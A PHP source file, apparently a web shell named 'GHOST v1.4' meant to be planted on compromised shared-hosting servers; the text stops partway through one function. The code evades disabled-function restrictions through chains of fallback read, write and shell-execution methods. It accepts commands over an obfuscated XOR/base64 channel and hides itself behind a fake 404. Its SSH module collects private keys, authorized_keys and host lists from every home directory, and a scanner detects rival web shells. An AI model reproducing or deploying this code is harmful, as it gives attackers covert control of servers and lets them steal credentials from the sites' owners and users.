<?php
/**
 * GHOST v1.4 — Loader-Aware Edition (Final & Fixed UI)
 * target: Linux + Apache/LiteSpeed + cPanel-style
 * php:    7.4+
 * author: VANTA / dj
 */

// [00] HEADER
@ob_start();
define('GHOST_DEBUG', false);
error_reporting(E_ALL);
ini_set('display_errors', '0');
ini_set('log_errors', '1');
set_time_limit(0);
ignore_user_abort(true);

if (function_exists('ini_set')) {
    @ini_set('memory_limit', '2048M');
    @ini_set('max_execution_time', '0');
}

// --- LOADER FIX: Resolusi Root Direktori ---
$doc_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
if (empty($doc_root) || !@is_dir($doc_root)) {
    $doc_root = @getcwd();
}
$GHOST_ROOT  = @realpath($doc_root) ?: $doc_root;
// Jika dijalankan via loader, __FILE__ akan menunjuk ke /tmp
// Kita gunakan SCRIPT_FILENAME untuk mencari nama file loader aslinya
$GHOST_SELF  = basename($_SERVER['SCRIPT_FILENAME'] ?? 'index.php');
$GHOST_VER   = '1.4';
$GHOST_BUILD = 'loader-aware';

$GHOST_TMP = null;
foreach ([@sys_get_temp_dir(), '/tmp', '/var/tmp', '/dev/shm'] as $cand) {
    if ($cand && @is_dir($cand) && @is_writable($cand)) { $GHOST_TMP = rtrim($cand, '/'); break; }
}
if (!$GHOST_TMP) $GHOST_TMP = $GHOST_ROOT;

ini_set('error_log', $GHOST_TMP . '/ghost_error.log');

define('GHOST_KEY', '');
define('GHOST_SECRET', 'change-me-random-32-char-string-here');
define('GHOST_SAFETY_SECONDS', 90);
define('GHOST_MARK_BEGIN', 'GHOSTB64BEGIN');
define('GHOST_MARK_END',   'GHOSTB64END');

if (GHOST_KEY !== '') {
    $given = (string)($_GET['k'] ?? $_POST['k'] ?? ($_SERVER['HTTP_X_GHOST_KEY'] ?? ''));
    if (!hash_equals(GHOST_KEY, $given)) { http_response_code(404); exit; }
}

if (session_status() === PHP_SESSION_NONE) { @session_start(); }
if (empty($_SESSION['ghost_csrf']))  $_SESSION['ghost_csrf']  = bin2hex(random_bytes(16));
if (empty($_SESSION['ghost_nonce'])) $_SESSION['ghost_nonce'] = bin2hex(random_bytes(12));
if (empty($_SESSION['ghost_field'])) $_SESSION['ghost_field'] = bin2hex(random_bytes(6));
$GHOST_CSRF  = $_SESSION['ghost_csrf'];
$GHOST_NONCE = $_SESSION['ghost_nonce'];
$GHOST_FIELD = $_SESSION['ghost_field'];

if (isset($_SESSION['ghost_caps']) && (time() - $_SESSION['ghost_caps']['probed_at']) > 300) unset($_SESSION['ghost_caps']);

// ============================================================
// [01] CAPABILITY PROBE
// ============================================================
function ghost_probe($force = false) {
    if (!$force && isset($_SESSION['ghost_caps']) && is_array($_SESSION['ghost_caps'])) return $_SESSION['ghost_caps'];

    $disabled = array_filter(array_map('trim', explode(',', (string)@ini_get('disable_functions'))));
    $disabled_lc = array_map('strtolower', $disabled);
    $blocked = function($fn) use ($disabled_lc) { return in_array(strtolower($fn), $disabled_lc, true); };
    $has_ext = function($ext) { return @extension_loaded($ext); };

    $prepend = (string)@ini_get('auto_prepend_file');
    $hijacked_prepend = $prepend !== '' && stripos($prepend, 'ghost') === false;

    $caps = [
        'php_version' => PHP_VERSION, 'sapi' => PHP_SAPI, 'os' => PHP_OS,
        'os_family' => @php_uname('s') ?: 'unknown', 'uname' => @php_uname('a') ?: '',
        'cwd' => @getcwd(), 'script' => @$_SERVER['SCRIPT_FILENAME'] ?? '', 'doc_root' => @$_SERVER['DOCUMENT_ROOT'] ?? '',
        'user' => function_exists('posix_getpwuid') && function_exists('posix_geteuid') ? (@posix_getpwuid(posix_geteuid())['name'] ?? '?') : '?',
        'uid' => function_exists('posix_geteuid') ? @posix_geteuid() : -1,
        'gid' => function_exists('posix_getegid') ? @posix_getegid() : -1,
        'is_root' => function_exists('posix_geteuid') ? @posix_geteuid() === 0 : false,
        'open_basedir' => @ini_get('open_basedir') ?: '',
        'open_basedir_paths' => array_filter(explode(PATH_SEPARATOR, (string)@ini_get('open_basedir'))),
        'disable_functions' => $disabled,
        'disable_classes' => array_filter(array_map('trim', explode(',', (string)@ini_get('disable_classes')))),
        'allow_url_fopen' => (bool)@ini_get('allow_url_fopen'),
        'allow_url_include' => (bool)@ini_get('allow_url_include'),
        'auto_prepend_file' => $prepend,
        'prepend_hijacked' => $hijacked_prepend,
        'has_curl' => $has_ext('curl'), 'has_mysqli' => $has_ext('mysqli'), 'has_pdo' => $has_ext('pdo'),
        'has_pdo_mysql' => $has_ext('pdo_mysql'), 'has_pdo_pgsql' => $has_ext('pdo_pgsql'), 'has_pgsql' => $has_ext('pgsql'),
        'has_sqlite3' => $has_ext('sqlite3'), 'has_zip' => $has_ext('zip'), 'has_phar' => $has_ext('phar'),
        'has_openssl' => $has_ext('openssl'), 'has_mbstring' => $has_ext('mbstring'), 'has_zlib' => $has_ext('zlib'),
        'has_json' => $has_ext('json'), 'tmp' => $GLOBALS['GHOST_TMP'] ?? null, 'probed_at' => time(),
        'has_cpanel' => @is_dir('/usr/local/cpanel') || @is_file('/usr/local/cpanel/version'),
        'has_plesk' => @is_dir('/usr/local/psa') || @is_file('/usr/local/psa/version'),
    ];

    $caps['exec_available'] = []; foreach (['system','exec','shell_exec','passthru','popen','proc_open','pcntl_exec'] as $fn) { $caps['exec_available'][$fn] = function_exists($fn) && !$blocked($fn); }
    $caps['read_available'] = []; foreach (['file_get_contents','fopen','file','readfile','highlight_file','show_source','SplFileObject','glob','scandir','opendir','DirectoryIterator','RecursiveDirectoryIterator'] as $fn) { $caps['read_available'][$fn] = (function_exists($fn) || class_exists($fn)) && !$blocked($fn); }
    $caps['write_available'] = []; foreach (['file_put_contents','fwrite','fputs','copy','rename','move_uploaded_file','error_log','touch','chmod'] as $fn) { $caps['write_available'][$fn] = function_exists($fn) && !$blocked($fn); }
    $caps['net_available'] = []; foreach (['curl_init','fsockopen','stream_socket_client','dns_get_record','mail'] as $fn) { $caps['net_available'][$fn] = function_exists($fn) && !$blocked($fn); }

    $_SESSION['ghost_caps'] = $caps;
    return $caps;
}
function ghost_caps() { return ghost_probe(); }
function ghost_can($fn) {
    $c = ghost_caps();
    foreach (['exec_available','read_available','write_available','net_available'] as $b) if (isset($c[$b][$fn])) return (bool)$c[$b][$fn];
    return false;
}

// ============================================================
// [02] FALLBACK LIBRARY
// ============================================================
function ghost_read($path) {
    $path = (string)$path;
    if ($path === '') return ['ok'=>false,'data'=>'','via'=>'','err'=>'empty path'];
    if (ghost_can('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return ['ok'=>true,'data'=>$d,'via'=>'file_get_contents','err'=>'']; }
    if (ghost_can('fopen')) { $fp = @fopen($path, 'rb'); if ($fp) { $d = ''; while (!@feof($fp)) { $chunk = @fread($fp, 8192); if ($chunk === false) break; $d .= $chunk; } @fclose($fp); return ['ok'=>true,'data'=>$d,'via'=>'fopen','err'=>'']; } }
    if (ghost_can('SplFileObject')) { try { $fo = new SplFileObject($path, 'r'); $d = ''; while (!$fo->eof()) { $d .= $fo->fgets(); } return ['ok'=>true,'data'=>$d,'via'=>'SplFileObject','err'=>'']; } catch (Throwable $e) {} }
    if (ghost_can('file')) { $arr = @file($path, FILE_IGNORE_NEW_LINES); if (is_array($arr)) return ['ok'=>true,'data'=>implode("\n",$arr),'via'=>'file()','err'=>'']; }
    if (ghost_can('readfile')) { ob_start(); $n = @readfile($path); $d = ob_get_clean(); if ($n !== false && $d !== '') return ['ok'=>true,'data'=>$d,'via'=>'readfile','err'=>'']; }
    if (ghost_can('highlight_file')) { ob_start(); $r = @highlight_file($path, true); $d = ob_get_clean(); if ($r !== false && $d !== '') return ['ok'=>true,'data'=>$d,'via'=>'highlight_file','err'=>'']; }
    foreach (['shell_exec','exec','system','passthru','popen'] as $fn) {
        if (!ghost_can($fn)) continue;
        $cmd = 'cat ' . escapeshellarg($path) . ' 2>/dev/null';
        if ($fn === 'shell_exec') { $d = @shell_exec($cmd); if ($d !== null && $d !== '') return ['ok'=>true,'data'=>$d,'via'=>'shell_exec cat','err'=>'']; }
        elseif ($fn === 'exec') { $out = []; @exec($cmd, $out, $rc); if ($rc === 0 && !empty($out)) return ['ok'=>true,'data'=>implode("\n",$out),'via'=>'exec cat','err'=>'']; }
        elseif ($fn === 'system') { ob_start(); @system($cmd, $rc); $d = ob_get_clean(); if ($rc === 0 && $d !== '') return ['ok'=>true,'data'=>$d,'via'=>'system cat','err'=>'']; }
        elseif ($fn === 'passthru') { ob_start(); @passthru($cmd, $rc); $d = ob_get_clean(); if ($rc === 0 && $d !== '') return ['ok'=>true,'data'=>$d,'via'=>'passthru cat','err'=>'']; }
        elseif ($fn === 'popen') { $fp = @popen($cmd, 'r'); if ($fp) { $d = ''; while (!@feof($fp)) { $d .= @fread($fp, 8192); } @pclose($fp); if ($d !== '') return ['ok'=>true,'data'=>$d,'via'=>'popen cat','err'=>'']; } }
    }
    if (ghost_can('curl_init')) { $ch = @curl_init('file://' . $path); if ($ch) { @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $d = @curl_exec($ch); @curl_close($ch); if ($d !== false && $d !== '') return ['ok'=>true,'data'=>$d,'via'=>'curl file://','err'=>'']; } }
    return ['ok'=>false,'data'=>'','via'=>'','err'=>'all read methods exhausted'];
}

function ghost_write($path, $data) {
    $path = (string)$path; $data = (string)$data;
    if ($path === '') return ['ok'=>false,'via'=>'','err'=>'empty path'];
    if (ghost_can('file_put_contents')) { $n = @file_put_contents($path, $data); if ($n !== false) return ['ok'=>true,'via'=>'file_put_contents','err'=>'']; }
    if (ghost_can('fopen')) { $fp = @fopen($path, 'wb'); if ($fp) { $n = @fwrite($fp, $data); @fclose($fp); if ($n !== false) return ['ok'=>true,'via'=>'fopen/fwrite','err'=>'']; } }
    if (ghost_can('SplFileObject')) { try { $fo = new SplFileObject($path, 'w'); $fo->fwrite($data); return ['ok'=>true,'via'=>'SplFileObject','err'=>'']; } catch (Throwable $e) {} }
    if (ghost_can('copy')) { $tmp = ($GLOBALS['GHOST_TMP'] ?? '/tmp') . '/ghost_' . bin2hex(random_bytes(4)); if (@file_put_contents($tmp, $data) !== false) { if (@copy($tmp, $path)) { @unlink($tmp); return ['ok'=>true,'via'=>'copy','err'=>'']; } @unlink($tmp); } }
    if (ghost_can('error_log')) { $r = @error_log($data, 3, $path); if ($r) return ['ok'=>true,'via'=>'error_log','err'=>'']; }
    $b64 = base64_encode($data);
    foreach (['shell_exec','exec','system','passthru','popen'] as $fn) {
        if (!ghost_can($fn)) continue;
        $cmd = 'printf %s ' . escapeshellarg($b64) . ' | base64 -d > ' . escapeshellarg($path) . ' 2>/dev/null';
        if ($fn === 'shell_exec') { @shell_exec($cmd); if (@is_file($path) && @filesize($path) === strlen($data)) return ['ok'=>true,'via'=>'shell_exec base64','err'=>'']; }
        elseif ($fn === 'exec') { @exec($cmd, $o, $rc); if ($rc === 0 && @is_file($path)) return ['ok'=>true,'via'=>'exec base64','err'=>'']; }
        elseif ($fn === 'system') { @system($cmd, $rc); if ($rc === 0 && @is_file($path)) return ['ok'=>true,'via'=>'system base64','err'=>'']; }
        elseif ($fn === 'passthru') { @passthru($cmd, $rc); if ($rc === 0 && @is_file($path)) return ['ok'=>true,'via'=>'passthru base64','err'=>'']; }
        elseif ($fn === 'popen') { $fp = @popen($cmd, 'r'); if ($fp) { @pclose($fp); } if (@is_file($path)) return ['ok'=>true,'via'=>'popen base64','err'=>'']; }
    }
    return ['ok'=>false,'via'=>'','err'=>'all write methods exhausted'];
}

function ghost_exec($cmd, $timeout = 30) {
    $cmd = (string)$cmd;
    if ($cmd === '') return ['ok'=>false,'out'=>'','rc'=>-1,'via'=>'','err'=>'empty cmd'];
    $t = (int)$timeout > 0 ? (int)$timeout : 30;
    if (ghost_can('shell_exec')) { $out = @shell_exec('timeout ' . $t . ' sh -c ' . escapeshellarg($cmd) . ' 2>&1'); if ($out !== null) return ['ok'=>true,'out'=>$out,'rc'=>0,'via'=>'shell_exec','err'=>'']; }
    if (ghost_can('exec')) { $o = []; $rc = -1; @exec('timeout ' . $t . ' sh -c ' . escapeshellarg($cmd) . ' 2>&1', $o, $rc); if ($rc !== -1) return ['ok'=>true,'out'=>implode("\n",$o),'rc'=>$rc,'via'=>'exec','err'=>'']; }
    if (ghost_can('system')) { ob_start(); @system('timeout ' . $t . ' sh -c ' . escapeshellarg($cmd) . ' 2>&1', $rc); $out = ob_get_clean(); if ($rc !== false) return ['ok'=>true,'out'=>$out,'rc'=>$rc,'via'=>'system','err'=>'']; }
    if (ghost_can('passthru')) { ob_start(); @passthru('timeout ' . $t . ' sh -c ' . escapeshellarg($cmd) . ' 2>&1', $rc); $out = ob_get_clean(); if ($rc !== false) return ['ok'=>true,'out'=>$out,'rc'=>$rc,'via'=>'passthru','err'=>'']; }
    if (ghost_can('popen')) { $fp = @popen('timeout ' . $t . ' sh -c ' . escapeshellarg($cmd) . ' 2>&1', 'r'); if ($fp) { $out = ''; while (!@feof($fp)) { $out .= @fread($fp, 8192); } $rc = @pclose($fp); return ['ok'=>true,'out'=>$out,'rc'=>$rc,'via'=>'popen','err'=>'']; } }
    if (ghost_can('proc_open')) { $desc = [1=>['pipe','w'],2=>['pipe','w']]; $p = @proc_open('timeout ' . $t . ' sh -c ' . escapeshellarg($cmd), $desc, $pipes); if (is_resource($p)) { $out = @stream_get_contents($pipes[1]); $err = @stream_get_contents($pipes[2]); @fclose($pipes[1]); @fclose($pipes[2]); $rc = @proc_close($p); return ['ok'=>true,'out'=>$out . $err,'rc'=>$rc,'via'=>'proc_open','err'=>'']; } }
    return ['ok'=>false,'out'=>'','rc'=>-1,'via'=>'','err'=>'all exec methods exhausted'];
}

function ghost_http($url, $opts = []) {
    $url = (string)$url;
    if ($url === '') return ['ok'=>false,'data'=>'','code'=>0,'via'=>'','err'=>'empty url'];
    $method = strtoupper($opts['method'] ?? 'GET'); $body = (string)($opts['body'] ?? ''); $headers = (array)($opts['headers'] ?? []); $timeout = (int)($opts['timeout'] ?? 10); $insecure = (bool)($opts['insecure'] ?? false);
    if (ghost_can('curl_init')) { $ch = @curl_init($url); if ($ch) { @curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_FOLLOWLOCATION=>true, CURLOPT_TIMEOUT=>$timeout, CURLOPT_SSL_VERIFYPEER=>!$insecure, CURLOPT_SSL_VERIFYHOST=>$insecure?0:2, CURLOPT_CUSTOMREQUEST=>$method]); if ($body !== '') @curl_setopt($ch, CURLOPT_POSTFIELDS, $body); if (!empty($headers)) @curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); $d = @curl_exec($ch); $code = (int)@curl_getinfo($ch, CURLINFO_HTTP_CODE); $err = @curl_error($ch); @curl_close($ch); if ($d !== false) return ['ok'=>true,'data'=>$d,'code'=>$code,'via'=>'curl','err'=>$err]; } }
    if (ghost_can('file_get_contents') && ghost_caps()['allow_url_fopen']) { $ctx = @stream_context_create(['http'=>['method'=>$method,'header'=>implode("\r\n",$headers),'content'=>$body,'timeout'=>$timeout,'ignore_errors'=>true],'ssl'=>['verify_peer'=>!$insecure,'verify_peer_name'=>!$insecure]]); $d = @file_get_contents($url, false, $ctx); if ($d !== false) return ['ok'=>true,'data'=>$d,'code'=>0,'via'=>'file_get_contents','err'=>'']; }
    if (ghost_can('fopen') && ghost_caps()['allow_url_fopen']) { $fp = @fopen($url, 'rb'); if ($fp) { $d = ''; while (!@feof($fp)) { $d .= @fread($fp, 8192); } @fclose($fp); return ['ok'=>true,'data'=>$d,'code'=>0,'via'=>'fopen','err'=>'']; } }
    return ['ok'=>false,'data'=>'','code'=>0,'via'=>'','err'=>'all http methods exhausted'];
}

function ghost_ls($dir) {
    $dir = (string)$dir;
    if ($dir === '' || !@is_dir($dir)) return ['ok'=>false,'items'=>[],'err'=>'not a dir'];
    $items = [];
    if (ghost_can('scandir')) { $arr = @scandir($dir); if (is_array($arr)) return ['ok'=>true,'items'=>$arr,'via'=>'scandir']; }
    if (ghost_can('DirectoryIterator')) { try { foreach (new DirectoryIterator($dir) as $f) { if ($f->isDot()) continue; $items[] = $f->getFilename(); } return ['ok'=>true,'items'=>$items,'via'=>'DirectoryIterator']; } catch (Throwable $e) {} }
    if (ghost_can('glob')) { $arr = @glob($dir . '/*'); if (is_array($arr)) { $items = array_map('basename', $arr); return ['ok'=>true,'items'=>$items,'via'=>'glob']; } }
    if (ghost_can('opendir')) { $dh = @opendir($dir); if ($dh) { while (($f = @readdir($dh)) !== false) { if ($f !== '.' && $f !== '..') $items[] = $f; } @closedir($dh); return ['ok'=>true,'items'=>$items,'via'=>'opendir']; } }
    if (ghost_can('shell_exec')) { $out = @shell_exec('ls -1a ' . escapeshellarg($dir) . ' 2>/dev/null'); if ($out !== null) { $items = array_values(array_filter(explode("\n", $out), function($x){ return $x !== '' && $x !== '.' && $x !== '..'; })); return ['ok'=>true,'items'=>$items,'via'=>'shell_exec ls']; } }
    return ['ok'=>false,'items'=>[],'err'=>'all ls methods exhausted'];
}

// ============================================================
// [03] CORE UTIL & ENVELOPES
// ============================================================
function ghost_h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function ghost_bytes($n) { $n = (float)$n; $u = ['B','KB','MB','GB','TB']; $i = 0; while ($n >= 1024 && $i < 4) { $n /= 1024; $i++; } return round($n, 2) . ' ' . $u[$i]; }
function ghost_rand($n = 8) { return bin2hex(random_bytes((int)ceil($n/2))); }
function ghost_csrf_ok() { $g = $_POST['csrf'] ?? $_GET['csrf'] ?? ''; return is_string($g) && $g !== '' && hash_equals($GLOBALS['GHOST_CSRF'], $g); }
function ghost_home_dirs() { $homes = []; foreach ([@glob('/home/*', GLOB_ONLYDIR) ?: [], ['/root'], ['/var/www']] as $g) { foreach ($g as $h) { if ($h && @is_dir($h)) $homes[] = $h; } } return array_values(array_unique($homes)); }
function ghost_deadline() { return time() + (int)GHOST_SAFETY_SECONDS; }
function ghost_expired($dl) { return time() >= $dl; }

function ghost_nonce_key($nonce) { return hash_hmac('sha256', $nonce, (string)GHOST_SECRET, true); }
function ghost_seal($json_str, $nonce) {
    $key = ghost_nonce_key($nonce);
    $x = ''; $klen = strlen($key); $slen = strlen($json_str);
    for ($i = 0; $i < $slen; $i++) $x .= $json_str[$i] ^ $key[$i % $klen];
    return base64_encode(base64_encode($x));
}
function ghost_unseal($sealed, $nonce) {
    if (!is_string($sealed) || $sealed === '') return null;
    $outer = @base64_decode($sealed, true); if ($outer === false) return null;
    $raw = @base64_decode($outer, true); if ($raw === false) return null;
    $key = ghost_nonce_key($nonce); $klen = strlen($key); if ($klen === 0) return null;
    $x = ''; $slen = strlen($raw);
    for ($i = 0; $i < $slen; $i++) $x .= $raw[$i] ^ $key[$i % $klen];
    return $x;
}
function ghost_request_payload() {
    $field = $GLOBALS['GHOST_FIELD'] ?? '';
    $blob = null; $nonce = '';
    foreach ([$field, '_blob', 'b'] as $cand) {
        if ($cand !== '' && !empty($_POST[$cand])) { $blob = (string)$_POST[$cand]; $nonce = (string)($_POST['_n'] ?? $_POST['n'] ?? $_POST['_nonce'] ?? ''); break; }
        if ($cand !== '' && !empty($_GET[$cand])) { $blob = (string)$_GET[$cand]; $nonce = (string)($_GET['_n'] ?? $_GET['n'] ?? $_GET['_nonce'] ?? ''); break; }
    }
    if ($blob !== null) {
        if ($nonce === '' || !hash_equals($GLOBALS['GHOST_NONCE'], $nonce)) return null;
        $decoded = ghost_unseal($blob, $nonce);
        if ($decoded === null) return null;
        $arr = json_decode($decoded, true);
        if (!is_array($arr)) return null;
        return ['act'=>$arr['act'] ?? '', 'params'=>$arr['params'] ?? []];
    }
    $act = (string)($_POST['act'] ?? $_GET['act'] ?? '');
    if ($act === '') return null;
    $params = [];
    foreach ($_POST as $k => $v) { if (in_array($k, ['act','csrf','_n','n','_nonce','_blob','b','k','_rnd'], true)) continue; $params[$k] = $v; }
    foreach ($_GET as $k => $v) { if (in_array($k, ['act','csrf','_n','n','_nonce','_blob','b','k','_rnd'], true)) continue; if (!isset($params[$k])) $params[$k] = $v; }
    return ['act'=>$act, 'params'=>$params];
}

function ghost_respond($data, $code = 200) {
    while (ob_get_level() > 0) @ob_end_clean();
    $json = json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    if ($json === false) $json = '{"ok":false,"err":"json encode failed"}';
    $payload = base64_encode(gzencode($json, 6));
    if ($payload === false || $payload === '') $payload = base64_encode($json);
    if (!headers_sent()) {
        @header('Content-Type: text/plain; charset=us-ascii', true, $code);
        @header('X-Content-Type-Options: nosniff');
        @header('Cache-Control: no-store');
    }
    echo GHOST_MARK_BEGIN . $payload . GHOST_MARK_END;
    // Ganti exit() dengan Exception agar loader bisa menangkap dan menghapus tmp
    throw new Exception("GHOST_EXIT");
}
function ghost_json($d, $c = 200) { ghost_respond($d, $c); }

// ============================================================
// [04] MOD: SCAN
// ============================================================
function ghost_scan_file($path) {
    $r = ghost_read($path); if (!$r['ok']) return null;
    $c = $r['data']; $size = strlen($c); $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $base = basename($path);
    $hits = []; $score = 0; $reason = '';

    $sigs = [
        'RCE'=>['system','shell_exec','passthru','popen','proc_open','pcntl_exec','assert','create_function'],
        'CALLBACK'=>['call_user_func','array_map','array_filter','register_shutdown_function','set_error_handler','ob_start'],
        'UPLOAD'=>['move_uploaded_file','$_FILES','file_put_contents','fwrite','fputs'],
        'OBFUSCATED'=>['eval','base64_decode','gzinflate','gzuncompress','str_rot13','strrev','hex2bin','convert_uu'],
        'FILE_MANIP'=>['unlink','chmod','chown','rename','copy','symlink','rmdir','mkdir'],
        'INFO_LEAK'=>['phpinfo','posix_getpwuid','gethostbyname'],
        'NETWORK'=>['fsockopen','stream_socket_client','curl_init','curl_exec','socket_create','dns_get_record','mail('],
        'DB_ABUSE'=>['mysqli_query','mysql_query','pg_query','PDO::query','PDO::exec','sqlite_query'],
        'CRYPTO'=>['openssl_encrypt','openssl_decrypt','mcrypt_','sodium_','hash_hmac','md5(','sha1('],
    ];
    $shell_names = ['c99','r57','b374k','wso','alfa','indoxploit','priv8','wso2','wso3','0byt3m1n1'];
    foreach ($shell_names as $name) { if (stripos($base, $name) !== false) { $hits[] = 'SHELL_NAME'; $score += 70; $reason .= 'known-shell name "' . $name . '"; '; break; } }

    $found_sigs = [];
    foreach ($sigs as $cat => $words) { foreach ($words as $w) { if (stripos($c, $w) !== false) $found_sigs[$cat][] = $w; } }
    foreach ($found_sigs as $cat => $words) { $hits[] = $cat; $score += 30; }

    if ($size > 200) { $freq = count_chars($c, 1); $ent = 0; foreach ($freq as $ch => $n) { $p = $n / $size; $ent -= $p * log($p, 2); } if ($ent > 6.0 && $ext === 'php') { $hits[] = 'HIGH_ENTROPY'; $score += 40; $reason .= 'entropy=' . round($ent, 2) . ' '; } }

    $decoded = ghost_deobfuscate($c, 2);
    if ($decoded !== $c) {
        $hits[] = 'DECODED'; $score += 35;
        $reason .= 'decoded +' . (strlen($decoded) - $size) . ' bytes; ';
        foreach ($sigs as $cat => $words) foreach ($words as $w) { if (stripos($decoded, $w) !== false && $cat !== 'OBFUSCATED') { $hits[] = 'DECODED_' . $cat; $score += 20; break; } }
    }

    if (preg_match('/\$[a-zA-Z_][a-zA-Z0-9_]*\s*\(/', $c)) { $hits[] = 'DYNAMIC_CALL'; $score += 25; }
    if (preg_match('/(system|exec|shell_exec|passthru|eval|assert|include|require)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)/i', $c)) { $hits[] = 'TAINTED_RCE'; $score += 60; $reason .= 'tainted superglobal → RCE; '; }
    if (preg_match('/[A-Za-z0-9+\/]{200,}={0,2}/', $c, $m)) { $hits[] = 'B64_BLOB'; $score += 30; }
    if (strpos($path, '/uploads/') !== false && in_array($ext, ['php','phtml','php3','php4','php5','php7','phar'])) { $hits[] = 'PHP_IN_UPLOADS'; $score += 70; $reason .= 'php in uploads; '; }
    if ($ext === 'php' && $size < 500 && strpos($path, 'wp-includes') === false && strpos($path, 'wp-admin') === false) { if (strlen(trim(strip_tags($c))) < 10) { $hits[] = 'EMPTY_PHP'; $score += 40; $reason .= 'empty shell; '; } }
    if (strpos($path, 'wp-content') !== false && $ext === 'php' && stripos($c, 'Plugin Name:') === false && strpos($path, '/plugins/') !== false) { $hits[] = 'PHP_IN_WPCONTENT'; $score += 30; }
    if ($score === 0) return null;
    return ['path'=>$path,'size'=>$size,'mtime'=>@filemtime($path),'hits'=>array_values(array_unique($hits)),'score'=>$score,'verdict'=>$score>=100?'CRITICAL':($score>=50?'HIGH':'MEDIUM'),'reason'=>trim($reason),'via'=>$r['via']];
}

function ghost_deobfuscate($c, $depth = 2) {
    if ($depth <= 0) return $c; $orig = $c;
    if (preg_match_all('/(?:base64_decode|eval|assert)\s*\(\s*[\'"]([A-Za-z0-9+\/]{40,}={0,2})[\'"]\s*\)/i', $c, $m)) foreach ($m[1] as $b64) { $d = @base64_decode($b64, true); if ($d !== false && strlen($d) > 10) $c .= "\n\n/* [ghost-decoded b64] */\n" . $d; }
    if (preg_match_all('/(?:gzinflate|gzuncompress|gzdecode)\s*\(\s*base64_decode\s*\(\s*[\'"]([A-Za-z0-9+\/]{40,}={0,2})[\'"]\s*\)\s*\)/i', $c, $m)) foreach ($m[1] as $b64) { $raw = @base64_decode($b64, true); if ($raw !== false) { $d = @gzinflate($raw); if ($d !== false && strlen($d) > 10) $c .= "\n\n/* [ghost-decoded gzinflate] */\n" . $d; } }
    if (preg_match_all('/str_rot13\s*\(\s*[\'"]([^\'"]{40,})[\'"]\s*\)/i', $c, $m)) foreach ($m[1] as $s) $c .= "\n\n/* [ghost-decoded rot13] */\n" . str_rot13($s);
    if ($c !== $orig) return ghost_deobfuscate($c, $depth - 1);
    return $c;
}

function ghost_scan_tree_page($root, $page = 1, $per_page = 60) {
    $page = max(1, (int)$page); $per_page = max(5, min(200, (int)$per_page));
    $limit_scan = 1500; $max_size = 1024 * 1024;
    $files = [];
    try {
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        $n = 0;
        foreach ($it as $f) {
            if ($n++ > $limit_scan) break;
            if (!$f->isFile()) continue;
            if ($f->getSize() > $max_size) continue;
            $ext = strtolower($f->getExtension());
            if (!in_array($ext, ['php','phtml','php3','php4','php5','php7','phar','inc','js','html','htaccess'])) continue;
            $files[] = $f->getPathname();
        }
    } catch (Throwable $e) {}
    $total = count($files);
    $offset = ($page - 1) * $per_page;
    $slice = array_slice($files, $offset, $per_page);
    $results = []; $dl = ghost_deadline();
    foreach ($slice as $path) {
        if (ghost_expired($dl)) break;
        $res = ghost_scan_file($path);
        if ($res) $results[] = $res;
    }
    usort($results, function($a,$b){ return $b['score'] - $a['score']; });
    return ['items'=>$results,'page'=>$page,'per_page'=>$per_page,'scanned'=>min($total, $offset + count($slice)),'total_candidates'=>$total,'done'=>($offset + count($slice)) >= $total];
}

// ============================================================
// [05] MOD: SSH
// ============================================================
function ghost_ssh_audit() {
    $out = ['authorized_keys'=>[],'private_keys'=>[],'known_hosts'=>[],'ssh_config'=>[],'sshd_config'=>[],'agent_sockets'=>[],'rc_files'=>[]];
    $homes = ghost_home_dirs();
    foreach ($homes as $h) {
        foreach (['.ssh/authorized_keys','.ssh/authorized_keys2'] as $rel) {
            $p = $h . '/' . $rel; if (!@is_file($p)) continue;
            $r = ghost_read($p); if (!$r['ok']) continue;
            $lines = preg_split('/\r?\n/', $r['data']);
            foreach ($lines as $i => $line) { $line = trim($line); if ($line === '' || $line[0] === '#') continue; if (preg_match('/^(ssh-(rsa|dss|ed25519)|ecdsa-sha2-)/', $line)) { $parts = preg_split('/\s+/', $line, 4); $out['authorized_keys'][] = ['file'=>$p,'line_no'=>$i+1,'type'=>$parts[0]??'?','comment'=>$parts[2]??'','line'=>$line]; } }
        }
        foreach (['.ssh/id_rsa','.ssh/id_dsa','.ssh/id_ecdsa','.ssh/id_ed25519'] as $rel) {
            $p = $h . '/' . $rel; if (!@is_file($p)) continue;
            $r = ghost_read($p); if (!$r['ok']) continue;
            if (strpos($r['data'], 'PRIVATE KEY') !== false) { $encrypted = strpos($r['data'], 'ENCRYPTED') !== false; $out['private_keys'][] = ['file'=>$p,'type'=>(strpos($r['data'],'BEGIN RSA')!==false)?'RSA':((strpos($r['data'],'BEGIN OPENSSH')!==false)?'OPENSSH':((strpos($r['data'],'BEGIN EC')!==false)?'EC':'DSA')),'encrypted'=>$encrypted,'size'=>strlen($r['data'])]; }
        }
        $p = $h . '/.ssh/known_hosts';
        if (@is_file($p)) { $r = ghost_read($p); if ($r['ok']) { foreach (preg_split('/\r?\n/', $r['data']) as $line) { $line = trim($line); if ($line === '' || $line[0] === '#') continue; $hosts = explode(' ', $line)[0]; if ($hosts) $out['known_hosts'][] = ['file'=>$p,'hosts'=>$hosts]; } } }
        $p = $h . '/.ssh/config';
        if (@is_file($p)) { $r = ghost_read($p); if ($r['ok']) $out['ssh_config'][] = ['file'=>$p,'body'=>$r['data']]; }
    }
    foreach (['/etc/ssh/sshd_config','/etc/ssh/sshd_config.d'] as $p) {
        if (@is_file($p)) { $r = ghost_read($p); if ($r['ok']) $out['sshd_config'][] = ['file'=>$p,'body'=>$r['data']]; }
        elseif (@is_dir($p)) { $ls = ghost_ls($p); foreach ($ls['items'] as $f) { if (substr($f,-5) !== '.conf') continue; $r = ghost_read($p . '/' . $f); if ($r['ok']) $out['sshd_config'][] = ['file'=>$p . '/' . $f,'body'=>$r['data']]; } }
    }
